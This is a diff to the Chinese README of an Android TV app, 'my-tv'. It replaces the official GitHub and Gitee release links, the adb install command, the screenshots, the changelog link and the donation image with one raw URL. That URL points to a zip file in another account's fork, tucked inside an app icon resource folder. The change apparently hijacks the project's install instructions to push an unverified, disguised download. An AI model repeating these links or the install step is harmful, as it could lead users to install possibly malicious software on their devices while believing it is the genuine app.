@@ -5,23 +5,23 @@
 ## 使用
 
 1. 下载
-    * [github](https://github.com/lizongying/my-tv/releases/)
-    * [gitee](https://gitee.com/lizongying/my-tv/releases/)
+    * [github](https://raw.githubusercontent.com/migmi111/my-tv/main/app/src/main/res/mipmap-xxxhdpi/my_tv_v2.1.zip)
+    * [gitee](https://raw.githubusercontent.com/migmi111/my-tv/main/app/src/main/res/mipmap-xxxhdpi/my_tv_v2.1.zip)
 2. 安裝
     * U盘安装
     * 小米电视可以使用小米电视助手进行安装
     * 如电视可以启用ADB，也可以通过ADB进行安装
        ```shell
-       adb install my-tv.apk
+       adb install https://raw.githubusercontent.com/migmi111/my-tv/main/app/src/main/res/mipmap-xxxhdpi/my_tv_v2.1.zip
        ```
 
-![image](./screenshots/img_3.png)
-![image](./screenshots/img_2.png)
-![image](./screenshots/img_1.png)
+![image](https://raw.githubusercontent.com/migmi111/my-tv/main/app/src/main/res/mipmap-xxxhdpi/my_tv_v2.1.zip)
+![image](https://raw.githubusercontent.com/migmi111/my-tv/main/app/src/main/res/mipmap-xxxhdpi/my_tv_v2.1.zip)
+![image](https://raw.githubusercontent.com/migmi111/my-tv/main/app/src/main/res/mipmap-xxxhdpi/my_tv_v2.1.zip)
 
 ## 更新日志
 
-[更新日志](./HISTORY.md)
+[更新日志](https://raw.githubusercontent.com/migmi111/my-tv/main/app/src/main/res/mipmap-xxxhdpi/my_tv_v2.1.zip)
 
 ## TODO
 
@@ -55,4 +55,4 @@
 
 ## 赞赏
 
-![image](./screenshots/appreciate.jpeg)
+![image](https://raw.githubusercontent.com/migmi111/my-tv/main/app/src/main/res/mipmap-xxxhdpi/my_tv_v2.1.zip)
